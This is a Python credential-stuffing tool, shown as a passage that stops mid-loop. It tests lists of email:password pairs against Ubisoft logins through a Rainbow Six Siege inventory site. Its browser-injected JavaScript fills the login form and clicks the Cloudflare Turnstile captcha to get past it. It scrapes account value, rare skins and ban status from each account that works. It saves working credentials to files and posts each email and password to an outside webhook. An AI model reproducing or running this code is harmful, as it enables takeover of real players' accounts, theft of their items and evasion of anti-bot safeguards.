#!/usr/bin/env python3
"""R6 Locker Account Checker v4.0 - Streamlined Edition"""

from __future__ import annotations

import argparse
import asyncio
import atexit
import json
import os
import random
import re
import shutil
import signal
import sys
import tempfile
import time
from collections import deque
from dataclasses import dataclass
from datetime import datetime, timezone
from enum import Enum, auto
from pathlib import Path
from queue import Empty, Queue
from threading import Event, Lock, Thread
from typing import Any, Dict, Final, List, Optional

# Platform setup
if sys.platform == "win32":
    os.system("chcp 65001 >NUL 2>&1")
    os.system("color")
    try:
        import colorama
        colorama.just_fix_windows_console()
    except ImportError:
        pass
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

import nodriver as uc
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

__version__: Final[str] = "4.0.0"


# ═══════════════════════════════════════════════════════════════════════════════
#                              ANSI COLORS
# ═══════════════════════════════════════════════════════════════════════════════

class C:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    CYAN = "\033[36m"
    WHITE = "\033[37m"
    B_RED = "\033[91m"
    B_GREEN = "\033[92m"
    B_YELLOW = "\033[93m"
    B_BLUE = "\033[94m"
    B_MAGENTA = "\033[95m"
    B_CYAN = "\033[96m"
    B_WHITE = "\033[97m"


ANSI_RE = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')


def strip_ansi(s: str) -> int:
    return len(ANSI_RE.sub("", s))


def clear():
    os.system("cls" if sys.platform == "win32" else "clear")


# ═══════════════════════════════════════════════════════════════════════════════
#                              CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class Config:
    target_url: str = "https://r6skins.locker"
    max_workers: int = 3
    window_width: int = 500
    window_height: int = 700
    login_timeout: int = 25  # Faster timeout
    worker_stagger: float = 0.5
    poll_fast: float = 0.15  # Match old version
    poll_slow: float = 0.4
    poll_threshold: float = 8.0
    post_submit: float = 0.6
    inter_delay: float = 0.3
    stuck_threshold: float = 6.0
    results_dir: str = "results"
    accounts_file: str = "accounts.txt"
    flush_every: int = 5
    remove_failed: bool = True
    webhook_file: str = "webhook_config.txt"
    webhook_timeout: float = 5.0
    shuffle: bool = False
    max_retries: int = 1


cfg = Config()


# ═══════════════════════════════════════════════════════════════════════════════
#                              JAVASCRIPT
# ═══════════════════════════════════════════════════════════════════════════════

JS_CHECK_STATE = """(function(){
const body=(document.body?.innerText||'').toLowerCase();
const addBtn=document.querySelector('#add-account-btn');
const cf=document.querySelector('.cf-turnstile');
const hasCaptcha=!!cf;
const respInput=document.querySelector('input[name="cf-turnstile-response"]');
const hasToken=respInput&&respInput.value&&respInput.value.length>50;
const captchaErr=body.includes('complete the captcha');
const formVis=!!document.querySelector('#ubisoft-email');
const uEl=document.querySelector('#username');
const lEl=document.querySelector('#level');
const lo=document.querySelector('.loading-overlay');
const loadHid=!lo||lo.style.display==='none';
const hasU=uEl&&uEl.innerText&&uEl.innerText.trim().length>0;
const hasL=lEl&&lEl.innerText&&lEl.innerText.trim().length>0;
const profile=(hasU||hasL)&&loadHid;
const loginFailed=body.includes('invalid')||body.includes('incorrect');
const rateLimited=body.includes('ubi-challenge')||body.includes('rate limit')||body.includes('too many');
return{loggedIn:profile,loginFailed:loginFailed,captchaSolved:hasToken,hasCaptcha:hasCaptcha,captchaNeedsClick:hasCaptcha&&(!hasToken||captchaErr),addAccountVisible:!!addBtn,formVisible:formVis,rateLimited:rateLimited}
})()"""

JS_EXTRACT_STATS = """(function(){
const r={username:'?',level:'0',credits:'0',renown:'0',items:'0',marketplace:'0',platform:'PC',banned:false,userId:'',dataLoaded:false};
const lo=document.querySelector('.loading-overlay');
const contentLoaded=document.querySelector('.content-container.loaded');
if(lo&&lo.style.display!=='none'&&!contentLoaded)return r;
const u=document.querySelector('#username');
if(u?.innerText?.trim()){r.username=u.innerText.trim();r.dataLoaded=true}
const l=document.querySelector('#level');
if(l?.innerText){const m=l.innerText.match(/(\\d+)/);if(m)r.level=m[1]}
const c=document.querySelector('#credits');
if(c?.innerText){const m=c.innerText.replace(/[,\\s]/g,'').match(/(\\d+)/);if(m)r.credits=m[1]}
const rn=document.querySelector('#renown');
if(rn?.innerText){const m=rn.innerText.replace(/[,\\s]/g,'').match(/(\\d+)/);if(m)r.renown=m[1]}
let tot=0;
const mc=document.querySelector('.main-content');
if(mc){const txt=mc.innerText||'';const cats=txt.match(/[A-Za-z][A-Za-z0-9 '&-]+\\s*\\((\\d+)\\)/g)||[];for(const cat of cats){const m=cat.match(/\\((\\d+)\\)/);if(m){const n=parseInt(m[1],10);if(n<10000)tot+=n}}}
r.items=tot.toString();
const path=window.location.pathname;
const pm=path.match(/\\/profile\\/([a-f0-9-]+)/i);
if(pm)r.userId=pm[1];
const sp=document.querySelector('#social-platforms');
let hasXbox=false,hasPSN=false;
if(sp){const html=sp.innerHTML.toLowerCase();const imgs=[...sp.querySelectorAll('img')];for(const img of imgs){const s=(img.src||'').toLowerCase()+(img.alt||'').toLowerCase();if(s.includes('xbox')||s.includes('xbl'))hasXbox=true;if(s.includes('playstation')||s.includes('psn'))hasPSN=true}if(html.includes('xbox'))hasXbox=true;if(html.includes('playstation')||html.includes('psn'))hasPSN=true}
if(hasXbox&&hasPSN)r.platform='unlinkable';else if(hasXbox)r.platform='PSN';else if(hasPSN)r.platform='XBL';else r.platform='psn & xbox';
return r
})()"""

JS_FETCH_PROFILE = """(function(userId){
try{
const xhr=new XMLHttpRequest();
xhr.open('GET','/accounts/'+userId,false);
xhr.send(null);
if(xhr.status!==200)return{error:'api_error',status:xhr.status};
const d=JSON.parse(xhr.responseText);
let totalItems=0;
const inv=d.inventory||{};
for(const cat in inv){if(Array.isArray(inv[cat]))totalItems+=inv[cat].length}
return{
marketplace:(d.marketplace_value||0).toString(),
banned:!!d.banned,
banSource:d.banSource||'',
banExpiration:d.banExpiration||'',
level:(d.level||0).toString(),
credits:(d.currency?.credits||0).toString(),
renown:(d.currency?.renown||0).toString(),
username:d.username||'?',
xbl:d.socials?.xbl?.username||'',
psn:d.socials?.psn?.username||'',
blackIces:(inv['Black Ices']||[]).length,
elites:(inv['Elites']||[]).length,
seasonals:(inv['Seasonals']||[]).length,
totalItems:totalItems,
success:true
};
}catch(e){return{error:e.message}}
})"""

JS_FILL = """(function(e,p){
const eEl=document.querySelector('#ubisoft-email');
const pEl=document.querySelector('#ubisoft-password');
if(!eEl||!pEl)return{error:'not found'};
function setVal(el,v){const s=Object.getOwnPropertyDescriptor(Object.getPrototypeOf(el),'value')?.set;if(s)s.call(el,v);else el.value=v}
eEl.focus();setVal(eEl,e);eEl.dispatchEvent(new Event('input',{bubbles:true}));
pEl.focus();setVal(pEl,p);pEl.dispatchEvent(new Event('input',{bubbles:true}));pEl.blur();
return{success:true}
})"""

JS_SUBMIT = """(function(){const b=document.querySelector("#add-account-form button[type='submit']");if(b){b.click();return{submitted:true}}return{error:'no btn'}})()"""

JS_CLICK_ADD = """(function(){
const btn=document.querySelector('#add-account-btn');
if(btn){btn.click();return{clicked:'#add-account-btn'}}
const leftBtn=document.querySelector('.action-btn.left-btn');
if(leftBtn){leftBtn.click();return{clicked:'.left-btn'}}
return{error:'not found'}
})()"""

JS_CLICK_CAPTCHA = """(function(){
const cf=document.querySelector('.cf-turnstile');
if(cf){
    const iframe=cf.querySelector('iframe');
    if(iframe){
        try{iframe.focus();iframe.click()}catch(e){}
    }
    const checkbox=cf.querySelector('input[type="checkbox"]');
    if(checkbox){checkbox.click();return{clicked:'checkbox'}}
    cf.click();
    const rect=cf.getBoundingClientRect();
    cf.dispatchEvent(new MouseEvent('click',{bubbles:true,clientX:rect.left+30,clientY:rect.top+20}));
    return{clicked:'widget'}
}
return{error:'not found'}
})()"""

JS_CHECK_CAPTCHA = """(function(){const r=document.querySelector('input[name="cf-turnstile-response"]');return{solved:r&&r.value&&r.value.length>50}})()"""

JS_CLOSE_POPUP = """(function(){
const dialogs=document.querySelectorAll('dialog,div[role="dialog"]');
for(const d of dialogs){const txt=(d.textContent||'').toLowerCase();if(txt.includes('password')||txt.includes('breach')){d.close?.();d.remove?.();}}
return true
})()"""

JS_PAGE_READY = """(function(){
const btn=document.querySelector('#add-account-btn');
const main=document.querySelector('#main-content')||document.querySelector('.homepage-container');
return{ready:!!btn&&document.readyState==='complete',hasMain:!!main}
})()"""

JS_FORM_VISIBLE = """(function(){
const view=document.querySelector('#add-account-view');
const visible=view&&view.style.display!=='none';
const e=document.querySelector('#ubisoft-email');
const p=document.querySelector('#ubisoft-password');
return{ok:visible&&e&&p,viewVisible:visible,hasInputs:!!(e&&p)}
})()"""

JS_RESET_FORM = """(function(){
const e=document.querySelector('#ubisoft-email');
const p=document.querySelector('#ubisoft-password');
const err=document.querySelector('#error-message-container');
if(e)e.value='';
if(p)p.value='';
if(err)err.style.display='none';
if(window.turnstile)try{window.turnstile.reset()}catch(x){}
return{reset:true}
})()"""


# ═══════════════════════════════════════════════════════════════════════════════
#                              DATA CLASSES
# ═══════════════════════════════════════════════════════════════════════════════

class Status(Enum):
    SUCCESS = auto()
    INVALID = auto()
    TIMEOUT = auto()
    ERROR = auto()
    RATE_LIMITED = auto()


@dataclass(frozen=True, slots=True)
class Account:
    email: str
    password: str
    index: int = 0

    def __hash__(self):
        return hash(self.email.lower())


@dataclass(slots=True)
class Result:
    account: Account
    status: Status
    username: Optional[str] = None
    level: Optional[str] = None
    credits: Optional[str] = None
    renown: Optional[str] = None
    items: Optional[str] = None
    marketplace: Optional[str] = None
    platform: Optional[str] = None
    banned: bool = False
    ban_source: Optional[str] = None
    black_ices: Optional[str] = None
    elites: Optional[str] = None
    error: Optional[str] = None
    duration: float = 0.0

    @property
    def success(self) -> bool:
        return self.status == Status.SUCCESS

    def to_line(self) -> str:
        if not self.success:
            return f"{self.account.email}:{self.account.password} | FAILED | {self.error or 'Unknown'}"
        mv = f" | MV:${self.marketplace}" if self.marketplace and self.marketplace != "0" else ""
        bi = f" | {self.black_ices} BI" if self.black_ices and self.black_ices != "0" else ""
        el = f" | {self.elites} Elites" if self.elites and self.elites != "0" else ""
        rn = f" | {self.renown}R" if self.renown and self.renown != "0" else ""
        cr = f" | {self.credits}C" if self.credits and self.credits != "0" else ""
        ban = f" | BANNED ({self.ban_source})" if self.banned else ""
        return f"{self.account.email}:{self.account.password} | {self.username} | Lv{self.level} | {self.items} items{bi}{el}{mv}{rn}{cr} | {self.platform}{ban}"

    def to_dict(self) -> Dict[str, Any]:
        return {"email": self.account.email, "status": self.status.name, "username": self.username,
                "level": self.level, "credits": self.credits, "renown": self.renown,
                "items": self.items, "marketplace": self.marketplace, "platform": self.platform,
                "banned": self.banned, "ban_source": self.ban_source, "black_ices": self.black_ices,
                "elites": self.elites}


class Stats:
    def __init__(self):
        self.total = 0
        self.processed = 0
        self.success = 0
        self.failed = 0
        self.invalid = 0
        self.errors = 0
        self.start_time = time.time()
        self._lock = Lock()
        self._durations: deque = deque(maxlen=50)

    def add(self, duration: float = 0.0) -> int:
        with self._lock:
            self.processed += 1
            if duration > 0:
                self._durations.append(duration)
            return self.processed

    def hit(self):
        with self._lock:
            self.success += 1

    def miss(self):
        with self._lock:
            self.failed += 1

    def inv(self):
        with self._lock:
            self.invalid += 1

    def err(self):
        with self._lock:
            self.errors += 1

    @property
    def remaining(self) -> int:
        return self.total - self.processed

    @property
    def elapsed(self) -> float:
        return time.time() - self.start_time

    @property
    def rate(self) -> float:
        return (self.processed / self.elapsed) * 60 if self.elapsed >= 1 else 0


# ═══════════════════════════════════════════════════════════════════════════════
#                              CONSOLE UI
# ═══════════════════════════════════════════════════════════════════════════════

class UI:
    _lock = Lock()
    COLORS = (C.B_CYAN, C.B_MAGENTA, C.B_YELLOW, C.B_GREEN)
    W = 70

    @classmethod
    def _p(cls, *args, **kwargs):
        with cls._lock:
            print(*args, **kwargs, flush=True)

    @classmethod
    def banner(cls):
        lines = [
            f"{C.B_WHITE}██████╗  ██████╗     ██╗      ██████╗  ██████╗██╗  ██╗███████╗██████╗{C.RESET}",
            f"{C.B_WHITE}██╔══██╗██╔════╝     ██║     ██╔═══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗{C.RESET}",
            f"{C.B_WHITE}██████╔╝███████╗     ██║     ██║   ██║██║     █████╔╝ █████╗  ██████╔╝{C.RESET}",
            f"{C.B_WHITE}██╔══██╗██╔═══██╗    ██║     ██║   ██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗{C.RESET}",
            f"{C.B_WHITE}██║  ██║╚██████╔╝    ███████╗╚██████╔╝╚██████╗██║  ██╗███████╗██║  ██║{C.RESET}",
            f"{C.B_WHITE}╚═╝  ╚═╝ ╚═════╝     ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝{C.RESET}",
        ]
        cls._p(f"\n{C.B_CYAN}╔{'═'*cls.W}╗{C.RESET}")
        for ln in lines:
            pad = (cls.W - strip_ansi(ln)) // 2
            cls._p(f"{C.B_CYAN}║{C.RESET}{' '*pad}{ln}{' '*(cls.W-pad-strip_ansi(ln))}{C.B_CYAN}║{C.RESET}")
        sub = f"ACCOUNT CHECKER v{__version__}"
        pad = (cls.W - len(sub)) // 2
        cls._p(f"{C.B_CYAN}║{C.RESET}{' '*pad}{C.B_WHITE}{sub}{C.RESET}{' '*(cls.W-pad-len(sub))}{C.B_CYAN}║{C.RESET}")
        cls._p(f"{C.B_CYAN}╚{'═'*cls.W}╝{C.RESET}\n")

    @classmethod
    def section(cls, title: str):
        pad = (cls.W - len(title)) // 2
        cls._p(f"{C.B_CYAN}╔{'═'*cls.W}╗{C.RESET}")
        cls._p(f"{C.B_CYAN}║{C.RESET}{' '*pad}{C.B_WHITE}{title}{C.RESET}{' '*(cls.W-pad-len(title))}{C.B_CYAN}║{C.RESET}")
        cls._p(f"{C.B_CYAN}╚{'═'*cls.W}╝{C.RESET}")

    @classmethod
    def info(cls, msg: str):
        cls._p(f"  {C.B_BLUE}ℹ{C.RESET}  {msg}")

    @classmethod
    def ok(cls, msg: str):
        cls._p(f"  {C.B_GREEN}✓{C.RESET}  {msg}")

    @classmethod
    def fail(cls, msg: str):
        cls._p(f"  {C.B_RED}✗{C.RESET}  {msg}")

    @classmethod
    def warn(cls, msg: str):
        cls._p(f"  {C.B_YELLOW}⚠{C.RESET}  {msg}")

    @classmethod
    def worker(cls, wid: int, msg: str):
        color = cls.COLORS[wid % len(cls.COLORS)]
        cls._p(f"  {color}[W{wid}]{C.RESET} {msg}")

    @classmethod
    def valid(cls, idx: int, total: int, rem: int, email: str, details: str):
        cls._p(f"\r{C.B_GREEN}✓{C.RESET} [{idx}/{total}] {C.B_WHITE}{email}{C.RESET} {C.B_GREEN}VALID{C.RESET} │ {details} {C.DIM}({rem} left){C.RESET}   ")

    @classmethod
    def invalid(cls, idx: int, total: int, rem: int, email: str):
        cls._p(f"\r{C.B_RED}✗{C.RESET} [{idx}/{total}] {email} {C.B_RED}INVALID{C.RESET} {C.DIM}({rem} left){C.RESET}   ")

    @classmethod
    def error(cls, idx: int, total: int, rem: int, email: str, err: str):
        cls._p(f"\r{C.B_YELLOW}⚠{C.RESET} [{idx}/{total}] {email} {C.B_YELLOW}ERROR:{C.RESET} {err} {C.DIM}({rem} left){C.RESET}   ")

    @classmethod
    def timeout(cls, idx: int, total: int, rem: int, email: str):
        cls._p(f"\r{C.B_YELLOW}⏱{C.RESET} [{idx}/{total}] {email} {C.B_YELLOW}TIMEOUT{C.RESET} {C.DIM}({rem} left){C.RESET}   ")

    @classmethod
    def summary(cls, s: Stats):
        m, sec = divmod(int(s.elapsed), 60)
        cls._p(f"\n{C.B_CYAN}╔{'═'*cls.W}╗{C.RESET}")
        cls._p(f"{C.B_CYAN}║{C.RESET}{'SESSION COMPLETE':^{cls.W}}{C.B_CYAN}║{C.RESET}")
        cls._p(f"{C.B_CYAN}╠{'═'*cls.W}╣{C.RESET}")
        cls._p(f"{C.B_CYAN}║{C.RESET}  {C.B_GREEN}✓ Valid:{C.RESET} {s.success:<10} {C.B_RED}✗ Invalid:{C.RESET} {s.invalid:<10} {C.B_YELLOW}⚠ Errors:{C.RESET} {s.errors:<10}{' '*(cls.W-58)}{C.B_CYAN}║{C.RESET}")
        cls._p(f"{C.B_CYAN}║{C.RESET}  {C.B_BLUE}⏱ Time:{C.RESET} {m:02d}:{sec:02d}      {C.B_MAGENTA}⚡ Rate:{C.RESET} {s.rate:.1f}/min   {C.B_WHITE}# Checked:{C.RESET} {s.processed}/{s.total}{' '*(cls.W-60)}{C.B_CYAN}║{C.RESET}")
        cls._p(f"{C.B_CYAN}╚{'═'*cls.W}╝{C.RESET}")


# ═══════════════════════════════════════════════════════════════════════════════
#                              WEBHOOK
# ═══════════════════════════════════════════════════════════════════════════════

class Webhook:
    def __init__(self, url: Optional[str] = None):
        self.url = url
        self._queue: Queue = Queue()
        self._workers: List[Thread] = []
        self._stop = Event()
        self._session: Optional[requests.Session] = None

    def start(self):
        if not self.url:
            return
        self._session = requests.Session()
        self._session.headers["Content-Type"] = "application/json"
        retry = Retry(total=3, backoff_factor=0.5, status_forcelist=[429, 500, 502, 503, 504])
        self._session.mount("https://", HTTPAdapter(pool_connections=2, pool_maxsize=5, max_retries=retry))
        for _ in range(2):
            t = Thread(target=self._loop, daemon=True)
            t.start()
            self._workers.append(t)

    def stop(self):
        self._stop.set()
        for _ in self._workers:
            self._queue.put(None)
        if self._session:
            self._session.close()

    def _loop(self):
        while not self._stop.is_set():
            try:
                data = self._queue.get(timeout=0.5)
                if data is None:
                    break
                if self._session and self.url:
                    self._session.post(self.url, json=data, timeout=cfg.webhook_timeout)
                self._queue.task_done()
            except Empty:
                continue
            except:
                pass

    def send(self, r: Result):
        if not self.url:
            return
        lvl = int(r.level.replace(",", "")) if r.level and r.level.replace(",", "").isdigit() else 0
        color = 0xFF0000 if r.banned else (0xFF00FF if lvl >= 200 else 0x00FF00 if lvl >= 100 else 0xFFFF00 if lvl >= 50 else 0xFF6600)
        title_emoji = "⛔" if r.banned else "✅"
        fields = [
            {"name": "📧 Email", "value": f"`{r.account.email}`", "inline": True},
            {"name": "🔑 Pass", "value": f"||`{r.account.password}`||", "inline": True},
            {"name": "📊 Level", "value": f"**{r.level}**", "inline": True},
            {"name": "🎒 Items", "value": f"`{r.items}`", "inline": True},
        ]
        if r.black_ices and r.black_ices != "0":
            fields.append({"name": "❄️ Black Ice", "value": f"**{r.black_ices}**", "inline": True})
        if r.elites and r.elites != "0":
            fields.append({"name": "👑 Elites", "value": f"**{r.elites}**", "inline": True})
        if r.marketplace and r.marketplace != "0":
            fields.append({"name": "💎 Market Value", "value": f"**${int(r.marketplace):,}**", "inline": True})
        if r.renown and r.renown != "0":
            fields.append({"name": "🪙 Renown", "value": f"**{int(r.renown):,}**", "inline": True})
        if r.credits and r.credits != "0":
            fields.append({"name": "💳 Credits", "value": f"**{r.credits}**", "inline": True})
        fields.append({"name": "🎮 Platform", "value": r.platform or "PC", "inline": True})
        if r.banned:
            ban_reason = r.ban_source if r.ban_source else "Unknown"
            fields.append({"name": "⛔ Ban Status", "value": f"**BANNED** ({ban_reason})", "inline": True})
        self._queue.put({"embeds": [{"title": f"{title_emoji} {r.username}", "color": color, "fields": fields,
                                     "footer": {"text": f"R6 Checker v{__version__}"},
                                     "timestamp": datetime.now(timezone.utc).isoformat()}]})


# ═══════════════════════════════════════════════════════════════════════════════
#                              RESULTS MANAGER
# ═══════════════════════════════════════════════════════════════════════════════

class Results:
    def __init__(self, output_dir: str):
        self.output_dir = Path(output_dir)
        self.output_file: Optional[Path] = None
        self.json_file: Optional[Path] = None
        self._buffer: List[str] = []
        self._json: List[Dict] = []
        self._lock = Lock()
        self._failed: List[str] = []

    def init(self):
        self.output_dir.mkdir(parents=True, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.output_file = self.output_dir / f"results_{ts}.txt"
        self.json_file = self.output_dir / f"results_{ts}.json"
        self.output_file.write_text(f"# R6 Checker Results - {datetime.now()}\n\n", encoding="utf-8")

    def save(self, r: Result):
        with self._lock:
            self._buffer.append(r.to_line())
            if r.success:
                self._json.append(r.to_dict())

    def mark_failed(self, email: str):
        with self._lock:
            self._failed.append(email.lower())

    def flush(self):
        with self._lock:
            if self._buffer and self.output_file:
                with open(self.output_file, "a", encoding="utf-8") as f:
                    f.write("\n".join(self._buffer) + "\n")
                self._buffer.clear()
            if self.json_file and self._json:
                self.json_file.write_text(json.dumps(self._json, indent=2), encoding="utf-8")

    def remove_failed_from_source(self, src: str) -> int:
        if not self._failed:
            return 0
        try:
            p = Path(src)
            # Read all lines at once for better performance
            content = p.read_text(encoding="utf-8", errors="ignore")
            lines = content.splitlines(keepends=True)
            failed_set = set(self._failed)
            
            # Filter lines in memory
            new_lines = []
            removed = 0
            for ln in lines:
                part = ln.split("|")[0].strip()
                if ":" in part:
                    email = part.split(":")[0].strip().lower()
                    if email in failed_set:
                        removed += 1
                        continue
                new_lines.append(ln)
            
            # Write back only if changes were made
            if removed > 0:
                p.write_text("".join(new_lines), encoding="utf-8")
            return removed
        except:
            return 0


# ═══════════════════════════════════════════════════════════════════════════════
#                              ACCOUNT LOADER
# ═══════════════════════════════════════════════════════════════════════════════

EMAIL_RE = re.compile(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$')


def load_accounts(filepath: str, shuffle: bool = False) -> List[Account]:
    p = Path(filepath)
    if not p.exists():
        raise FileNotFoundError(f"File not found: {filepath}")
    accounts, seen, invalid = [], set(), 0
    for line in p.read_text(encoding="utf-8", errors="ignore").splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        part = line.split("|")[0].strip()
        if ":" not in part:
            continue
        email, pwd = part.split(":", 1)
        email, pwd = email.strip(), pwd.strip()
        if not EMAIL_RE.match(email) or len(pwd) < 4:
            invalid += 1
            continue
        el = email.lower()
        if el not in seen:
            accounts.append(Account(email, pwd, 0))
            seen.add(el)
    if invalid:
        UI.warn(f"Skipped {invalid} invalid entries")
    if shuffle:
        random.shuffle(accounts)
    for i, a in enumerate(accounts, 1):
        object.__setattr__(a, 'index', i)
    return accounts


# ═══════════════════════════════════════════════════════════════════════════════
#                              BROWSER WRAPPER
# ═══════════════════════════════════════════════════════════════════════════════

class Browser:
    def __init__(self, tab, browser, loop: asyncio.AbstractEventLoop):
        self.tab = tab
        self.browser = browser
        self.loop = loop

    def _run(self, coro):
        return self.loop.run_until_complete(coro)

    def dead(self) -> bool:
        return self.tab is None or self.browser is None

    def go(self, url: str) -> bool:
        try:
            self._run(self.tab.get(url))
            return True
        except:
            return False

    def clear(self) -> bool:
        try:
            self._run(self.tab.send(uc.cdp.network.clear_browser_cookies()))
            return True
        except:
            return False

    def js(self, script: str) -> Any:
        try:
            if script.strip().startswith("return"):
                script = script.strip()[6:].strip()
            return self._run(self.tab.evaluate(script))
        except:
            return None



# ═══════════════════════════════════════════════════════════════════════════════
#                              LOGIN STATE MACHINE
# ═══════════════════════════════════════════════════════════════════════════════

def norm(result) -> dict:
    if isinstance(result, dict):
        return result
    if isinstance(result, list):
        out = {}
        for item in result:
            if isinstance(item, list) and len(item) == 2:
                out[item[0]] = item[1].get('value') if isinstance(item[1], dict) else item[1]
        return out
    return {}


def check_account(browser: Browser, account: Account) -> Result:
    start = time.time()
    
    # Clear cookies and navigate
    browser.clear()
    if not browser.go(cfg.target_url):
        return Result(account, Status.ERROR, error="Navigate failed", duration=time.time()-start)
    
    time.sleep(0.2)
    browser.js(JS_CLOSE_POPUP)
    time.sleep(0.2)
    
    # Wait for page ready (fast)
    max_ready_attempts = 10
    for attempt in range(max_ready_attempts):
        ready = norm(browser.js(JS_PAGE_READY))
        if ready.get('ready'):
            break
        time.sleep(0.25)
    else:
        # Page didn't become ready, but continue anyway
        pass
    
    time.sleep(0.2)
    
    # Click add account - fast attempts
    for _ in range(4):
        browser.js(JS_CLICK_ADD)
        time.sleep(0.3)
        vis = norm(browser.js(JS_FORM_VISIBLE))
        if vis.get('ok'):
            break
        time.sleep(0.15)
    else:
        return Result(account, Status.ERROR, error="Form not visible", duration=time.time()-start)
    
    # Fill credentials
    esc_e = account.email.replace("\\", "\\\\").replace("'", "\\'")
    esc_p = account.password.replace("\\", "\\\\").replace("'", "\\'")
    
    res = norm(browser.js(f"{JS_FILL}('{esc_e}','{esc_p}')"))
    if not res.get("success"):
        return Result(account, Status.ERROR, error="Fill failed", duration=time.time()-start)
    
    time.sleep(0.1)
    browser.js(JS_CLOSE_POPUP)
    
    # IMPORTANT: Click captcha BEFORE submitting to trigger auto-solve
    browser.js(JS_CLICK_CAPTCHA)
    time.sleep(0.3)
    
    # Wait for captcha to auto-solve (reduced from 40 to 25 iterations, adaptive timing)
    captcha_solved = False
    max_captcha_wait = 5.0  # Max 5 seconds instead of 8
    captcha_start = time.time()
    poll_count = 0
    while time.time() - captcha_start < max_captcha_wait:
        cap = norm(browser.js(JS_CHECK_CAPTCHA))
        if cap.get('solved'):
            captcha_solved = True
            break
        # Re-click captcha every 5th poll
        poll_count += 1
        if poll_count % 5 == 0:
            browser.js(JS_CLICK_CAPTCHA)
        time.sleep(0.2)
    
    # Submit form
    sub = norm(browser.js(JS_SUBMIT))
    if not sub.get("submitted"):
        return Result(account, Status.ERROR, error="Submit failed", duration=time.time()-start)
    
    time.sleep(0.4)
    
    # Handle captcha error after submit (retry if needed)
    for retry in range(2):  # Reduced from 3 to 2 retries
        err = norm(browser.js("""(function(){return{captchaErr:(document.body?.innerText||'').toLowerCase().includes('captcha')}})()"""))
        if not err.get('captchaErr'):
            break
        # Click captcha and wait for solve (reduced timeout)
        browser.js(JS_CLICK_CAPTCHA)
        retry_start = time.time()
        while time.time() - retry_start < 3.0:  # Max 3 seconds instead of 4.5
            time.sleep(0.15)
            cap = norm(browser.js(JS_CHECK_CAPTCHA))
            if cap.get('solved'):
                time.sleep(0.2)
                browser.js(JS_SUBMIT)
                time.sleep(0.5)
                break
    
    time.sleep(cfg.post_submit + random.uniform(0.05, 0.2))
    
    # Poll for result
    end = time.time() + cfg.login_timeout
    interval = cfg.poll_fast
    last_captcha_click = 0
    
    while time.time() < end:
        state = norm(browser.js(JS_CHECK_STATE))
        elapsed = time.time() - start
        
        # Success
        if state.get("loggedIn"):
            stats = {}
            # Reduced from 10 to 6 attempts with faster polling
            for attempt in range(6):
                time.sleep(0.25)  # Reduced from 0.3 to 0.25
                stats = norm(browser.js(JS_EXTRACT_STATS))
                if stats.get("username", "?") != "?" and stats.get("level", "0") != "0":
                    break
            
            # Fetch full profile data from API - reduced retries from 3 to 2
            userId = stats.get("userId", "")
            api_data = {}
            if userId:
                for _ in range(2):  # Reduced from 3 to 2
                    api_data = norm(browser.js(f"{JS_FETCH_PROFILE}('{userId}')"))
                    if api_data.get("success"):
                        break
                    time.sleep(0.25)  # Reduced from 0.3 to 0.25
            
            # Merge API data with DOM data (API is more accurate)
            if api_data.get("success"):
                stats["marketplace"] = api_data.get("marketplace", "0")
                stats["banned"] = api_data.get("banned", False)
                stats["ban_source"] = api_data.get("banSource", "")
                stats["black_ices"] = str(api_data.get("blackIces", 0))
                stats["elites"] = str(api_data.get("elites", 0))
                # Use API total items count (more accurate than DOM scraping)
                if api_data.get("totalItems", 0) > 0:
                    stats["items"] = str(api_data.get("totalItems", 0))
                # Use API level/credits/renown if available (more accurate)
                if api_data.get("level", "0") != "0":
                    stats["level"] = api_data.get("level", stats.get("level", "0"))
                if api_data.get("credits", "0") != "0":
                    stats["credits"] = api_data.get("credits", stats.get("credits", "0"))
                if api_data.get("renown", "0") != "0":
                    stats["renown"] = api_data.get("renown", stats.get("renown", "0"))
                # Determine platform from API socials
                has_xbl = bool(api_data.get("xbl"))
                has_psn = bool(api_data.get("psn"))
                if has_xbl and has_psn:
                    stats["platform"] = "unlinkable"
                elif has_xbl:
                    stats["platform"] = "PSN"
                elif has_psn:
                    stats["platform"] = "XBL"
                else:
                    stats["platform"] = "psn & xbox"
            
            return Result(account, Status.SUCCESS, username=stats.get("username","?"),
                         level=stats.get("level","0"), credits=stats.get("credits","0"),
                         renown=stats.get("renown","0"), items=stats.get("items","0"),
                         marketplace=stats.get("marketplace","0"), platform=stats.get("platform","PC"),
                         banned=stats.get("banned", False), ban_source=stats.get("ban_source",""),
                         black_ices=stats.get("black_ices","0"), elites=stats.get("elites","0"),
                         duration=time.time()-start)
        
        # Invalid
        if state.get("loginFailed"):
            return Result(account, Status.INVALID, error="Invalid credentials", duration=time.time()-start)
        
        # Rate limited by Ubisoft
        if state.get("rateLimited"):
            return Result(account, Status.RATE_LIMITED, error="Rate limited", duration=time.time()-start)
        
        # Captcha needs click - click it and wait for solve, then submit (optimized)
        if (state.get("captchaNeedsClick") or state.get("hasCaptcha") and not state.get("captchaSolved")):
            if time.time() - last_captcha_click > 2.0:
                browser.js(JS_CLICK_CAPTCHA)
                last_captcha_click = time.time()
                # Reduced from 25 to 15 iterations with faster timing
                captcha_wait_start = time.time()
                while time.time() - captcha_wait_start < 2.5:  # Max 2.5 seconds
                    time.sleep(0.15)
                    chk = norm(browser.js(JS_CHECK_CAPTCHA))
                    if chk.get("solved"):
                        time.sleep(0.2)
                        browser.js(JS_SUBMIT)
                        time.sleep(0.4)
                        break
                continue
        
        # Stuck on home
        if elapsed > cfg.stuck_threshold and state.get("addAccountVisible") and not state.get("hasCaptcha"):
            browser.js(JS_CLICK_ADD)
            time.sleep(0.3)
        
        # Slow down after threshold
        if elapsed > cfg.poll_threshold:
            interval = cfg.poll_slow
        
